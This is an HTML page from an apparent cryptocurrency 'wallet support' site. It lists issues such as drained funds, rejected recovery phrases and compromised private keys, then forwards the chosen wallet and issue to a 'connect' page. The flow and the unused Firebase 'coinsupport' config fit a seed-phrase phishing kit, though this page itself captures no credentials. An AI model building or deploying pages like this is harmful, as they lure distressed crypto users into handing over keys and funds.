<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select an Issue</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    
    <style>
        body { background-color: #000; color: white; font-family: system-ui, sans-serif; }
        .card { transition: all 0.2s ease; }
        .card:hover { transform: translateY(-4px); border-color: #3b82f6; box-shadow: 0 0 15px rgba(59, 130, 246, 0.3); }
        .category-header { color: #6b7280; text-transform: uppercase; letter-spacing: 0.1em; font-size: 0.75rem; margin-top: 1.5rem; margin-bottom: 0.5rem; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <div class="max-w-md w-full bg-gray-900 p-8 rounded-xl border border-gray-800 shadow-lg">
        <h1 class="text-2xl font-bold mb-6 text-center">Select an Issue</h1>

        <!-- Display Wallet Name from previous step -->
        <div class="mb-6 text-center">
            <p class="text-gray-400 text-sm">Wallet:</p>
            <p id="wallet-display" class="text-white font-mono text-lg truncate">Loading...</p>
        </div>

        <!-- Issue Selection Grid -->
        <div class="grid grid-cols-1 gap-4">
            
            <!-- Category: Common Issues -->
            <div class="category-header">Common Issues</div>

            <button onclick="selectIssue('Sent to Wrong Address')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Sent to Wrong Address</span>
                    <span class="text-xs text-gray-500">I sent funds to an incorrect address or wrong network.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Hacked / Funds Drained')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Hacked / Funds Drained</span>
                    <span class="text-xs text-gray-500">My wallet was compromised and funds were stolen.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Wallet Not Syncing')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Wallet Not Syncing</span>
                    <span class="text-xs text-gray-500">My balance is not showing correctly or the app is freezing.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Lost Access / Locked Out')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Lost Access / Locked Out</span>
                    <span class="text-xs text-gray-500">I forgot my password, lost my seed phrase, or can't log in.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Transaction Delay')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Transaction Delay</span>
                    <span class="text-xs text-gray-500">Click here for any transaction related error.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <!-- Category: Technical Errors -->
            <div class="category-header">Technical Errors</div>

            <button onclick="selectIssue('Locked Data')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Locked Data</span>
                    <span class="text-xs text-gray-500">Corrupted wallet data.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Login Error')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Login Error</span>
                    <span class="text-xs text-gray-500">Error messages during wallet import.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Address Error')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Address Error</span>
                    <span class="text-xs text-gray-500">Incorrect wallet address format.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Privacy Compromised')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Privacy Compromised</span>
                    <span class="text-xs text-gray-500">Private key compromised.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Phrase Error')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Phrase Error</span>
                    <span class="text-xs text-gray-500">Recovery phrase not accepted.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Lost Credentials')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Lost Credentials</span>
                    <span class="text-xs text-gray-500">Seed phrase backup lost?</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Wallet Malfunction')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Wallet Malfunction</span>
                    <span class="text-xs text-gray-500">Slow wallet UI response?</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <!-- Category: Exchange & Other -->
            <div class="category-header">Exchange & Support</div>

            <button onclick="selectIssue('Exchange')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Exchange</span>
                    <span class="text-xs text-gray-500">Token exchange or resolve errors during exchange.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

            <button onclick="selectIssue('Other / General Support')" class="card bg-gray-800 hover:bg-gray-700 p-4 rounded-lg text-left flex items-center justify-between group">
                <div>
                    <span class="font-semibold block group-hover:text-blue-400">Other / General Support</span>
                    <span class="text-xs text-gray-500">Something else isn't working as expected.</span>
                </div>
                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-500 group-hover:text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" /></svg>
            </button>

        </div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const firebaseConfig = {
            apiKey: "AIzaSyC...YOUR_API_KEY...", 
            authDomain: "coinsupport-8b036.firebaseapp.com",
            databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
            projectId: "coinsupport-8b036",
            storageBucket: "coinsupport-8b036.appspot.com",
            messagingSenderId: "...",
            appId: "..."
        };

        // Initialize Firebase (Required if you want to save issues directly later)
        // import { initializeApp } from "firebase/app";
        // const app = initializeApp(firebaseConfig);

        // --- LOGIC ---

        // 1. Get Wallet Name from previous page
        const walletName = localStorage.getItem('selectedWallet') || 'Unknown Wallet';
        document.getElementById('wallet-display').textContent = walletName;

        // 2. Generate a unique Ticket ID immediately
        const ticketId = `TICKET-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
        
        // Save Ticket ID to LocalStorage so other pages can find it
        localStorage.setItem('currentTicketId', ticketId);

        // 3. Handle Issue Selection
        function selectIssue(issueType) {
            // Save the issue type
            localStorage.setItem('selectedIssue', issueType);
            
            // Redirect to connect.html with the ID included in the URL
            window.location.href = `connect.html?wallet=${encodeURIComponent(walletName)}&issue=${encodeURIComponent(issueType)}&id=${ticketId}`;
        }
    </script>
</body>
</html>
